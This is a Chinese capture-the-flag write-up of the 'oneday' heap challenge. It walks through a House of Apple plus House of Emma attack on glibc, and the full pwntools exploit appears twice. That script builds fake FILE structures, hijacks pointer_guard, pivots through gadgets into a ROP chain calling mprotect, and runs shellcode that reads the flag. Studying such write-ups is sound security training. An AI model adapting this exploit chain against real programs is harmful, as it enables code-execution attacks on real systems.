# Pwn-oneday题目解析

> 原文: https://www.ctfiot.com/164936.html
> ID: 164936

一

前言

二

前置知识

mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];

三

脚本分析

io.sendlineafter(b'enter your key >>n', str(10).encode())
add(2)#0
add(2)#1
add(1)#2
delete(2)
delete(1)
delete(0)

add(1)#3
add(1)#4
add(1)#5
add(1)#6
delete(3)
delete(5)
show(3)
libc_base = u64(io.recvuntil(b'x7f')[-6:].ljust(8, b'x00')) - 0x1f2cc0
io.recv(2)
heap_base = u64(io.recv(6).ljust(8, b'x00')) - 0x17f0
delete(4)
delete(6)

add(3)#7
add(1)#8
add(1)#9
delete(8)
add(3)#10

之后就是对于两个进行house of apple和house of emma的fake file伪造，这里利用了pwncli的IO_FILE_plus_struct()，这里用pwntools的FileStructure的话没有_mode的字段，所以选择了这个，伪造的字段首先利用House of apple攻击了pointer_guard，这里设置_IO_read_ptr为0xa81是为了伪造chunk3的size域，以便之后free的时候不会报错，之后将chain指向下一个伪造House of emma的fake file地址，之后按照house of apple中的限制条件填写对应的字段 ，并且把_wide_data指向pointer_guard，这样就可以将其覆盖为我们已知的地址。

对于house of emma的构造也是根据对应的限制条件，对于file进行构造，但是对于house of emma的一些攻击构造并不是在file的结构上面构造的，所以在之后的payload书写过程中也会进一步对于之后的字段进行伪造，这里只是单独对于file需要满足的条件进行伪造。

f1 = IO_FILE_plus_struct()
f1._IO_read_ptr = 0xa81
f1.chain = chain
f1._flags2 = 8
f1._lock = _lock
f1._mode = 0
f1._wide_data = point_guard_addr
f1.vtable = _IO_wstrn_jumps

f2 = IO_FILE_plus_struct()
f2._IO_write_base = 0
f2._IO_write_ptr = 1
f2._mode = 0
f2._lock = _lock
f2._flags2 = 8
f2.vtable = _IO_cookie_jumps + 0x58

通过这两个file结构的伪造，我们就可以对于payload进行编写，这里主要是利用chunk2来伪造bk_nextsize和之后的对于chunk3字段内容的伪造和fake file的构造，具体payload如下，这里解释以下对应字段的作用。

data = flat({
 0x8: target_addr - 0x20,
 0x10: {
 0: {
 0: bytes(f1),
 0x100:{
 0: bytes(f2),
 0xe0: [chain + 0x100, rol(magic_gadget ^ expected, 0x11)],
 0x100: [
 add_rsp_0x20_pop_rbx_ret,
 chain + 0x100,
 0,
 0,
 mov_rsp_rdx_ret,
 0,
 pop_rdi_ret,
 chain & ~0xfff,
 pop_rsi_ret,
 0x4000,
 pop_rdx_rbx_ret,
 7, 0,
 libc_base + libc.sym['mprotect'],
 chain + 0x200
 ],
 0x200: asm(shellcraft.open('./flag', 0) + shellcraft.read(3, heap_base, 0x100) + shellcraft.write(1, heap_base, 0x100))
 }
 },
 0xa80: [0, 0xab1]
 }
})

首先就是伪造了bk_nextsize，让他指向了_IO_list_all – 0x20这里，这样之后进行large bin attck之后就会向_IO_list_all填写伪造好的chunk3的地址，之后就是填写f1的fake file，这里主要是伪造了chunk3的size域和house of apple的对应对应攻击内容，这里解释以下chain为什么设置为heap_base + 0x1910，首先看一下的largebins的chunk距离heap_base的偏移为0x17e0，之后由于我们是在chunk2的指针进行编写payload的，所以fake file1的起始距离这个largebins的偏移为0x30，之后根据上述payload可以看到f2的起始位置距离f1的起始位置偏移为0x100，相加起来就是0x1910。

在这个fake file2填写完之后伪造了__cookie字段和read字段，伪造后的_IO_cookie_file结构如下：

将read指针覆盖为magic_gadget，其实就是pcop这个gadget，由于执行这段gadget的时候rdi的值为__cookie的值，所以将其覆盖为chain + 0x100，之后观察payload的构造，rdi + 8的地方写入的地址就是rdi的地址，所以rdx也指向了这段代码，之后将rdx + 0x20处写上mov_rsp_rdx_ret这段gadget的地址，这样就可以将rsp也赋值到rdx和rdi指向的这个地方，之后再这个开始的地方写add_rsp_0x20_pop_rbx_ret，这段gadget，这样就可以将rsp减去0x28（加上pop的0x8）。

mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];

这样rsp指向的就是下面这部分rop链，这里就是利用mprotect函数将这段区域增加了rwx的权限，因此就可以对这里进行orw攻击了，并且最终跳转到chain + 0x200这里，这里是用shellcode编写的读取flag并且输出的汇编指令。

pop_rdi_ret,
chain & ~0xfff,
pop_rsi_ret,
0x4000,
pop_rdx_rbx_ret,
7, 0,
libc_base + libc.sym['mprotect'],
chain + 0x200

自此就完成了整个对于House of apple和house of emma的攻击，最后需要注意的是，由于我们需要free这个伪造的chunk3，所以在他结束的地方需要填写一个伪造的chunk的size来绕过检测机制，之后只需要输入一个不在选项中的数，退出main函数就可以触发整个攻击的流程，完成读取flag，这里也是本地的环境，可以看到输出了success也就是flag的内容。

from pwn import *
from pwncli import *
io = process("./oneday")
libc = ELF("./libc.so.6")
context.arch = 'amd64'
def add(choice):
 io.recvuntil(b'enter your command: n')
 io.sendline(b'1')
 io.recvuntil(b'choise: ')
 io.sendline(str(choice).encode())

def delete(idx):
 io.recvuntil(b'enter your command: n')
 io.sendline(b'2')
 io.recvuntil(b'Index: n')
 io.sendline(str(idx).encode())

def edit(idx, message):
 io.recvuntil(b'enter your command: n')
 io.sendline(b'3')
 io.recvuntil(b'Index: ')
 io.sendline(str(idx).encode())
 io.recvuntil(b'Message: n')
 io.send(message)

def show(idx):
 io.recvuntil(b'enter your command: n')
 io.sendline(b'4')
 io.recvuntil(b'Index: ')
 io.sendline(str(idx).encode())

def exit():
 io.recvuntil(b'enter your command: n')
 io.sendline(b'9')

io.sendlineafter(b'enter your key >>n', str(10).encode())
add(2)#0
add(2)#1
add(1)#2
delete(2)
delete(1)
delete(0)
add(1)#3
add(1)#4
add(1)#5
add(1)#6
delete(3)
delete(5)
show(3)
libc_base = u64(io.recvuntil(b'x7f')[-6:].ljust(8, b'x00')) - 0x1f2cc0
io.recv(2)
heap_base = u64(io.recv(6).ljust(8, b'x00')) - 0x17f0
delete(4)
delete(6)
add(3)#7
add(1)#8
add(1)#9
delete(8)
add(3)#10

target_addr = libc_base + libc.sym['_IO_list_all']
_IO_wstrn_jumps = libc_base + 0x1f3d20
_IO_cookie_jumps = libc_base + 0x1f3ae0
_lock = libc_base + 0x1f5720
point_guard_addr = libc_base - 0x2890
expected = heap_base + 0x1900
chain = heap_base + 0x1910
magic_gadget = libc_base + 0x146020

mov_rsp_rdx_ret = libc_base + 0x56530
add_rsp_0x20_pop_rbx_ret = libc_base + 0xfd449
pop_rdi_ret = libc_base + 0x2daa2
pop_rsi_ret = libc_base + 0x37c0a
pop_rdx_rbx_ret = libc_base + 0x87729

f1 = IO_FILE_plus_struct()
f1._IO_read_ptr = 0xa81
f1.chain = chain
f1._flags2 = 8
f1._lock = _lock
f1._mode = 0
f1._wide_data = point_guard_addr
f1.vtable = _IO_wstrn_jumps

f2 = IO_FILE_plus_struct()
f2._IO_write_base = 0
f2._IO_write_ptr = 1
f2._mode = 0
f2._lock = _lock
f2._flags2 = 8
f2.vtable = _IO_cookie_jumps + 0x58

data = flat({
 0x8: target_addr - 0x20,
 0x10: {
 0: {
 0: bytes(f1),
 0x100:{
 0: bytes(f2),
 0xe0: [chain + 0x100, rol(magic_gadget ^ expected, 0x11)],
 0x100: [
 add_rsp_0x20_pop_rbx_ret,
 chain + 0x100,
 0,
 0,
 mov_rsp_rdx_ret,
 0,
 pop_rdi_ret,
 chain & ~0xfff,
 pop_rsi_ret,
 0x4000,
 pop_rdx_rbx_ret,
 7, 0,
 libc_base + libc.sym['mprotect'],
 chain + 0x200
 ],
 0x200: asm(shellcraft.open('./flag', 0) + shellcraft.read(3, heap_base, 0x100) + shellcraft.write(1, heap_base, 0x100))
 }
 },
 0xa80: [0, 0xab1]
 }
})

edit(5, data)
delete(2)
add(3)
exit()
io.interactive()

四

debug来了解整个攻击的流程

这里通过debug来更好的了解house of apple是如何实现攻击的，首先我们断点定在_IO_wstrn_overflow，在这里就是对于pointer_guard进行修改的函数，经过下图的一系列赋值，我们可以看到对应的值都已经修改为我们可以预测到的值了，方便之后进行house of emma的加密pcop的gadget。

之后就是在_IO_cookie_read进行断点，可以看到house of emma的攻击过程。

这里可以看到解密之后我们调用对应函数指针就已经指向了pcop的gadget的地方了，经过对应的call函数，我们可以看到已经和预想的一样执行到我们的rop链地址。

之后就是进入到了mprotect的阶段，修改对应位置的权限。

修改完之后可以看到已经开始执行我们写的shellcode了，并且vmmap可以看到对应段落的权限。

自此完成了所有攻击的内容，读出对应的flag内容。

五

总结

该题目很好的阐述了house of apple是如何进行利用的，并且结合了house of emma，使得对于高版本的堆利用有了更进一步的理解，这里也对house of apple进行一个总结，这个攻击对于这个题目主要的意义在一只能进行一次任意地址写已知地址，但是对于house of emma需要两次，所以可以利用house of apple，这样就相当于多增加了一次large bin attack的机会，这种攻击方式对于题目edit有限制的时候十分有效果。

看雪ID：a2ure

https://bbs.kanxue.com/user-home-991890.htm

*本文为看雪论坛优秀文章，由 a2ure 原创，转载请注明来自看雪社区

# 往期推荐

1、区块链智能合约逆向-合约创建-调用执行流程分析

2、在Windows平台使用VS2022的MSVC编译LLVM16

3、神挡杀神——揭开世界第一手游保护nProtect的神秘面纱

4、为什么在ASLR机制下DLL文件在不同进程中加载的基址相同

5、2022QWB final RDP

6、华为杯研究生国赛 adv_lua

球分享

球点赞

球在看

点击阅读原文查看更多


```
一
前言
二
前置知识
mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
三
脚本分析
io.sendlineafter(b'enter your key >>n', str(10).encode())
add(2)#0
add(2)#1
add(1)#2
delete(2)
delete(1)
delete(0)
add(1)#3
add(1)#4
add(1)#5
add(1)#6
delete(3)
delete(5)
show(3)
libc_base = u64(io.recvuntil(b'x7f')[-6:].ljust(8, b'x00')) - 0x1f2cc0
io.recv(2)
heap_base = u64(io.recv(6).ljust(8, b'x00')) - 0x17f0
delete(4)
delete(6)
add(3)#7
add(1)#8
add(1)#9
delete(8)
add(3)#10
f1 = IO_FILE_plus_struct()
f1._IO_read_ptr = 0xa81
f1.chain = chain
f1._flags2 = 8
f1._lock = _lock
f1._mode = 0
f1._wide_data = point_guard_addr
f1.vtable = _IO_wstrn_jumps

f2 = IO_FILE_plus_struct()
f2._IO_write_base = 0
f2._IO_write_ptr = 1
f2._mode = 0
f2._lock = _lock
f2._flags2 = 8
f2.vtable = _IO_cookie_jumps + 0x58
data = flat({
 0x8: target_addr - 0x20,
 0x10: {
 0: {
 0: bytes(f1),
 0x100:{
 0: bytes(f2),
 0xe0: [chain + 0x100, rol(magic_gadget ^ expected, 0x11)],
 0x100: [
 add_rsp_0x20_pop_rbx_ret,
 chain + 0x100,
 0,
 0,
 mov_rsp_rdx_ret,
 0,
 pop_rdi_ret,
 chain & ~0xfff,
 pop_rsi_ret,
 0x4000,
 pop_rdx_rbx_ret,
 7, 0,
 libc_base + libc.sym['mprotect'],
 chain + 0x200
 ],
 0x200: asm(shellcraft.open('./flag', 0) + shellcraft.read(3, heap_base, 0x100) + shellcraft.write(1, heap_base, 0x100))
 }
 },
 0xa80: [0, 0xab1]
 }
})
mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
pop_rdi_ret,
chain & ~0xfff,
pop_rsi_ret,
0x4000,
pop_rdx_rbx_ret,
7, 0,
libc_base + libc.sym['mprotect'],
chain + 0x200
from pwn import *
from pwncli import *
io = process("./oneday")
libc = ELF("./libc.so.6")
context.arch = 'amd64'
def add(choice):
 io.recvuntil(b'enter your command: n')
 io.sendline(b'1')
 io.recvuntil(b'choise: ')
 io.sendline(str(choice).encode())

def delete(idx):
 io.recvuntil(b'enter your command: n')
 io.sendline(b'2')
 io.recvuntil(b'Index: n')
 io.sendline(str(idx).encode())

def edit(idx, message):
 io.recvuntil(b'enter your command: n')
 io.sendline(b'3')
 io.recvuntil(b'Index: ')
 io.sendline(str(idx).encode())
 io.recvuntil(b'Message: n')
 io.send(message)

def show(idx):
 io.recvuntil(b'enter your command: n')
 io.sendline(b'4')
 io.recvuntil(b'Index: ')
 io.sendline(str(idx).encode())

def exit():
 io.recvuntil(b'enter your command: n')
 io.sendline(b'9')

io.sendlineafter(b'enter your key >>n', str(10).encode())
add(2)#0
add(2)#1
add(1)#2
delete(2)
delete(1)
delete(0)
add(1)#3
add(1)#4
add(1)#5
add(1)#6
delete(3)
delete(5)
show(3)
libc_base = u64(io.recvuntil(b'x7f')[-6:].ljust(8, b'x00')) - 0x1f2cc0
io.recv(2)
heap_base = u64(io.recv(6).ljust(8, b'x00')) - 0x17f0
delete(4)
delete(6)
add(3)#7
add(1)#8
add(1)#9
delete(8)
add(3)#10

target_addr = libc_base + libc.sym['_IO_list_all']
_IO_wstrn_jumps = libc_base + 0x1f3d20
_IO_cookie_jumps = libc_base + 0x1f3ae0
_lock = libc_base + 0x1f5720
point_guard_addr = libc_base - 0x2890
expected = heap_base + 0x1900
chain = heap_base + 0x1910
magic_gadget = libc_base + 0x146020

mov_rsp_rdx_ret = libc_base + 0x56530
add_rsp_0x20_pop_rbx_ret = libc_base + 0xfd449
pop_rdi_ret = libc_base + 0x2daa2
pop_rsi_ret = libc_base + 0x37c0a
pop_rdx_rbx_ret = libc_base + 0x87729

f1 = IO_FILE_plus_struct()
f1._IO_read_ptr = 0xa81
f1.chain = chain
f1._flags2 = 8
f1._lock = _lock
f1._mode = 0
f1._wide_data = point_guard_addr
f1.vtable = _IO_wstrn_jumps

f2 = IO_FILE_plus_struct()
f2._IO_write_base = 0
f2._IO_write_ptr = 1
f2._mode = 0
f2._lock = _lock
f2._flags2 = 8
f2.vtable = _IO_cookie_jumps + 0x58

data = flat({
 0x8: target_addr - 0x20,
 0x10: {
 0: {
 0: bytes(f1),
 0x100:{
 0: bytes(f2),
 0xe0: [chain + 0x100, rol(magic_gadget ^ expected, 0x11)],
 0x100: [
 add_rsp_0x20_pop_rbx_ret,
 chain + 0x100,
 0,
 0,
 mov_rsp_rdx_ret,
 0,
 pop_rdi_ret,
 chain & ~0xfff,
 pop_rsi_ret,
 0x4000,
 pop_rdx_rbx_ret,
 7, 0,
 libc_base + libc.sym['mprotect'],
 chain + 0x200
 ],
 0x200: asm(shellcraft.open('./flag', 0) + shellcraft.read(3, heap_base, 0x100) + shellcraft.write(1, heap_base, 0x100))
 }
 },
 0xa80: [0, 0xab1]
 }
})

edit(5, data)
delete(2)
add(3)
exit()
io.interactive()
四
debug来了解整个攻击的流程
五
总结
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/10-1709115115.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/7-1709115116.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/1-1709115116.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/8-1709115116.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/2-1709115117.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/7-1709115117.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/9-1709115118.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/2-1709115118.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/3-1709115119.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/6-1709115119.png)